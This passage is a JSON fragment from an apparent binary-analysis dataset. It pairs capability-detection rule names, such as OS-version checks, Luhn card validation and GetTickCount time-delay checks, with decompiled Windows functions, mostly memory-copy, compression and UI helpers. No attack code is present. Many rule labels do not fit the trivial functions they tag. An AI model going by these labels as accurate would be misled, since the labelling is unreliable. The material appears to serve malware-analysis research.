        "decompiled_code": "\nuint32_t __cdecl fcn.00453144(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_CL;\n    int32_t in_EDX;\n    uint var_5h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x45316a\n    switch(in_CL) {\n    case 1:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 2:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 3:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 4:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 554
    },
    "0047e684": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0047e684(void)\n\n{\n    uint in_EAX;\n    \n    // switch table (7 cases) at 0x47e690\n    switch(in_EAX) {\n    case 0:\n        sub.shell32.dll_ShellExecuteA(0, 0x47e6fc, 0x47e6f4, 0, 0, 5);\n        return;\n    case 1:\n        sub.shell32.dll_ShellExecuteA(0, 0x47e6fc, 0x47e704, 0, 0, 5);\n        return;\n    case 3:\n        fcn.00467b50();\n        return;\n    case 4:\n        fcn.00467b88();\n        return;\n    case 5:\n        fcn.00467bc0();\n        return;\n    case 6:\n        fcn.00467bf8();\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00423aa4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00423aa4(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "0046a664": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046a664(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2 >> 8;\n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2;\n    return;\n}\n",
        "token_count": 163
    },
    "0046c9c0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c9c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = arg_8h >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    fcn.0046d624(1);\n    return;\n}\n",
        "token_count": 437
    },
    "0046d548": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0046d548(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) == 0x10) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 0;\n        *(in_EAX + 0x16b8) = 0;\n        return;\n    }\n    if (7 < *(in_EAX + 0x16b8)) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -8;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0048e6d4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0048e6d4(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48e75a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x497c64 == 0;\n    *0x497c64 = *0x497c64 + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion();\n        *0x497c60 = 3 < uVar1;\n        fcn.0045cf10();\n        fcn.00419014();\n        fcn.004190b4();\n        fcn.00419060();\n        fcn.00419060();\n        fcn.00419060();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 234
    },
    "00432f04": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: uCode\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00432f04(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint uCode;\n    \n    uCode._0_1_ = in_AL;\n    fcn.0040546c();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(uCode, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "004071cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004071cc(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 39
    },
    "00401590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401590(int32_t param_1, int32_t param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    param_1 = param_1 + -0xc;\n    iVar2 = in_EAX + param_1;\n    param_2 = param_2 + param_1;\n    iVar3 = -param_1;\n    if (0 < param_1) {\n        do {\n            iVar1 = *(iVar3 + iVar2);\n            *(iVar3 + 8 + param_2) = ROUND(*(iVar3 + 8 + iVar2));\n            *(iVar3 + param_2) = ROUND(iVar1);\n            iVar3 = iVar3 + 0x10;\n        } while (iVar3 < 0);\n    }\n    *(iVar3 + param_2) = ROUND(*(iVar3 + iVar2));\n    *(iVar3 + 8 + param_2) = *(iVar3 + 8 + iVar2);\n    return;\n}\n",
        "token_count": 234
    },
    "0040247c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040247c(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004030ec();\n    return param_2 + param_1;\n}\n",
        "token_count": 47
    },
    "00402510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402510(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    \n    if (((999 < in_EDX) || (cVar1 = fcn.00402494(arg_8h),  cVar1 == '\\0')) ||\n       (cVar1 = fcn.00402494(arg_8h),  cVar1 == '\\0')) {\n        return 0;\n    }\n    if ((in_EAX == *(in_EAX + -0x4c)) &&\n       ((*(in_EAX + -0x24) == 0 ||\n        ((cVar1 = fcn.00402494(arg_8h),  cVar1 != '\\0' && (cVar1 = fcn.00402510(arg_8h),  cVar1 != '\\0')))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 208
    },
    "00402590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402590(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = *in_EAX;\n    cVar1 = fcn.00402510(&stack0xfffffffc);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 93
    },
    "00402df4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402df4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *0x49370c;\n    while (iVar1 != 0x493708) {\n        iVar1 = *(iVar1 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    iVar2 = 0x37;\n    iVar1 = 0x490044;\n    do {\n        *(iVar1 + 0x14) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        *(iVar1 + 8) = 1;\n        *(iVar1 + 0xc) = 0;\n        iVar1 = iVar1 + 0x20;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x493708 = 0x493708;\n    *0x49370c = 0x493708;\n    iVar2 = 0x400;\n    iVar1 = 0x4937a8;\n    do {\n        *iVar1 = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n        iVar3 = *0x4957b0;\n    } while (iVar2 != 0);\n    while (iVar3 != 0x4957ac) {\n        iVar3 = *(iVar3 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    *0x4957ac = 0x4957ac;\n    *0x4957b0 = 0x4957ac;\n    return;\n}\n",
        "token_count": 369
    },
    "00403088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403088(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x0040309e:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x004030a9;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x0040309e;\n    param_1 = 0;\ncode_r0x004030a9:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "004030ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.004030ec(uint32_t param_1, int64_t *param_2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t *in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    \n    if (in_EAX != param_2) {\n        if (0x20 < param_1) {\n            if (0x20 < param_1) {\n                if ((param_2 < in_EAX) ||\n                   (piVar11 = param_2 - param_1,  param_2 = param_1 + piVar11,  in_EAX <= piVar11)) {\n                    iVar2 = *in_EAX;\n                    piVar11 = (param_1 - 8) + in_EAX;\n                    piVar1 = param_2 + (param_1 - 8);\n                    iVar3 = *piVar11;\n                    iVar8 = ((param_2 & 0xfffffff8) + 8) - piVar1;\n                    do {\n                        *(iVar8 + piVar1) = ROUND(*(iVar8 + piVar11));\n                        bVar12 = SCARRY4(iVar8, 8);\n                        iVar8 = iVar8 + 8;\n                    } while (bVar12 != iVar8 < 0);\n                    *piVar1 = ROUND(iVar3);\n                    *param_2 = ROUND(iVar2);\n                    return;\n                }\n                iVar9 = param_1 - 8;\n                iVar2 = *(iVar9 + in_EAX);\n                iVar3 = *in_EAX;\n                iVar8 = (iVar9 + param_2 & 0xfffffff8U) - param_2;\n                do {\n                    *(iVar8 + param_2) = ROUND(*(iVar8 + in_EAX));\n                    iVar10 = iVar8 + -8;\n                    bVar12 = 7 < iVar8;\n                    iVar8 = iVar10;\n                } while (iVar10 != 0 && bVar12);\n                *param_2 = ROUND(iVar3);\n                *(iVar9 + param_2) = ROUND(iVar2);\n            }\n            return;\n        }\n        iVar8 = param_1 - 8;\n        if (iVar8 == 0 || param_1 < 8) {\n            switch(param_1) {\n            case 0:\n                goto code_r0x00403121;\n            case 1:\n                *param_2 = *in_EAX;\n                return;\n            case 2:\n                *param_2 = *in_EAX;\n                return;\n            case 3:\n                uVar5 = *(in_EAX + 2);\n                *param_2 = *in_EAX;\n                *(param_2 + 2) = uVar5;\n                return;\n            case 4:\n                *param_2 = *in_EAX;\n                return;\n            case 5:\n                uVar5 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar5;\n                return;\n            case 6:\n                uVar6 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar6;\n                return;\n            case 7:\n                uVar7 = *(in_EAX + 3);\n                *param_2 = *in_EAX;\n                *(param_2 + 3) = uVar7;\n                return;\n            case 8:\n                *param_2 = ROUND(*in_EAX);\n                return;\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xd:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            default:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x12:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x13:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x14:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar2 = *(iVar8 + in_EAX);\n        iVar3 = *in_EAX;\n        if (8 < iVar8) {\n            iVar4 = in_EAX[1];\n            if (0x10 < iVar8) {\n                param_2[2] = ROUND(in_EAX[2]);\n            }\n            param_2[1] = ROUND(iVar4);\n        }\n        *param_2 = ROUND(iVar3);\n        *(iVar8 + param_2) = ROUND(iVar2);\n    }\ncode_r0x00403121:\n    return;\n}\n",
        "token_count": 1536
    },
    "004033ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004033ac(void)\n\n{\n    int32_t iVar1;\n    uchar auStack8 [8];\n    \n    iVar1 = sub.kernel32.dll_QueryPerformanceCounter();\n    if (iVar1 != 0) {\n        *0x490008 = auStack8;\n        return;\n    }\n    *0x490008 = sub.kernel32.dll_GetTickCount();\n    return;\n}\n",
        "token_count": 83
    },
    "00403aac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403aac(uchar param_1, int32_t param_2)\n\n{\n    ulong uVar1;\n    ulong *in_EAX;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    uVar2 = CONCAT11(param_1, param_1);\n    if (0x1f < param_2) {\n        *in_EAX = uVar2;\n        *(in_EAX + 2) = uVar2;\n        *(in_EAX + 4) = uVar2;\n        *(in_EAX + 6) = uVar2;\n        uVar1 = *in_EAX;\n        *(param_2 + -0x10 + in_EAX) = uVar1;\n        *(param_2 + -8 + in_EAX) = uVar1;\n        iVar3 = (in_EAX & 7) - 8;\n        iVar4 = param_2 + -0x10 + iVar3;\n        iVar3 = iVar4 - iVar3;\n        iVar4 = -iVar4;\n        do {\n            *(in_EAX + iVar4 + iVar3) = uVar1;\n            *(in_EAX + iVar4 + 8 + iVar3) = uVar1;\n            bVar5 = SCARRY4(iVar4, 0x10);\n            iVar4 = iVar4 + 0x10;\n        } while (bVar5 != iVar4 < 0);\n        return;\n    }\n    *(param_2 + -1 + in_EAX) = param_1;\n    switch(param_2) {\n    default:\n        return;\n    case 0x1e:\n    case 0x1f:\n        *(in_EAX + 0x1c) = uVar2;\n    case 0x1c:\n    case 0x1d:\n        *(in_EAX + 0x1a) = uVar2;\n    case 0x1a:\n    case 0x1b:\n        *(in_EAX + 3) = uVar2;\n    case 0x18:\n    case 0x19:\n        *(in_EAX + 0x16) = uVar2;\n    case 0x16:\n    case 0x17:\n        *(in_EAX + 0x14) = uVar2;\n    case 0x14:\n    case 0x15:\n        *(in_EAX + 0x12) = uVar2;\n    case 0x12:\n    case 0x13:\n        *(in_EAX + 2) = uVar2;\n    case 0x10:\n    case 0x11:\n        *(in_EAX + 0xe) = uVar2;\n    case 0xe:\n    case 0xf:\n        *(in_EAX + 0xc) = uVar2;\n    case 0xc:\n    case 0xd:\n        *(in_EAX + 10) = uVar2;\n    case 10:\n    case 0xb:\n        *(in_EAX + 1) = uVar2;\n    case 8:\n    case 9:\n        *(in_EAX + 6) = uVar2;\n    case 6:\n    case 7:\n        *(in_EAX + 4) = uVar2;\n    case 4:\n    case 5:\n        *(in_EAX + 2) = uVar2;\n    case 2:\n    case 3:\n        *in_EAX = uVar2;\n        return;\n    }\n}\n",
        "token_count": 780
    },
    "00403c7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403c7c(void)\n\n{\n    uint uVar1;\n    char cStack264;\n    \n    fcn.0040546c();\n    fcn.00403c70();\n    uVar1 = fcn.004056d0();\n    while (cStack264 == -1) {\n        fcn.00403c70();\n        fcn.004056d0();\n        fcn.00405738();\n        fcn.0040546c();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "00403fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403fcc(int32_t param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f88(param_1, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar3 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n            iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n            if (param_1 < iVar2) break;\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n            param_1 = param_1 - iVar2;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *param_2;\n                param_2 = param_2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = (**(in_EAX + 0x1c))();\n            if (iVar2 != 0) {\n                fcn.0040306c();\n                return in_EAX;\n            }\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_1;\n        for (; param_1 != 0; param_1 = param_1 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 399
    },
    "00404608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404608(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 33
    },
    "00404610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404610(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004046c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046c4(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004046db. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004046dd. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 359
    },
    "00404788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00404788(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 251
    },
    "0040480c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040480c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "00404880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404880(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004048c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048c4(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "004049bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
